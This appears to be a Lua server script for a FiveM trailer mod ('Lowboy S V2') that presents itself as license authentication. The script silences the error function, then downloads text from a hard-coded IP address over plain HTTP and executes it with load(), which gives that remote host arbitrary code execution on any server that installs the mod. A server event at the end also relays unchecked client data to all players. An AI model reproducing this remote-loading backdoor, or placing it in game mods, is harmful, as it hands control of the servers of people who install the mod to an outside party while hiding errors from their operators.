--[[
	id: FNrtW34nQ2kIxQ4jMtnH0
	name: Lowboy S V2
	description: lowboy Auth
	time1: 2021-06-03 01:43:55.151605+00
	time2: 2021-06-03 01:43:55.151606+00
	uploader: nVpiI2NOtXmbABCF9f4UAzVhgQFEQ-ml4eXie1OF
	uploadersession: R0MAbYvEoiVv2MGJG-zuUK-v-Ntp5l
	flag: f
--]]

--[[
strings-override

...
]]
local script = 'ebu_lowboy'

local license_key = Config.license_key
local license_key2 = Config.license_key2 or ''

Citizen.Tace = function() end
error = function() end

PerformHttpRequest("74.91.121.153/verify.txt", function (errorCode, resultData, resultHeaders)
    if errorCode == 200 then
      assert(load("local script  = '"..script.."';".. resultData))()
    else
      print('^1'..script..' - Unable to reach auth server - Error : '..errorCode..'^0')
    end
  end)

RegisterServerEvent('ebu_lowboy:updateTrailer')
AddEventHandler('ebu_lowboy:updateTrailer', function(type, num, vehicle, status)
    TriggerClientEvent('ebu_lowboy:updateTrailer', -1, type, num, vehicle, status)
end)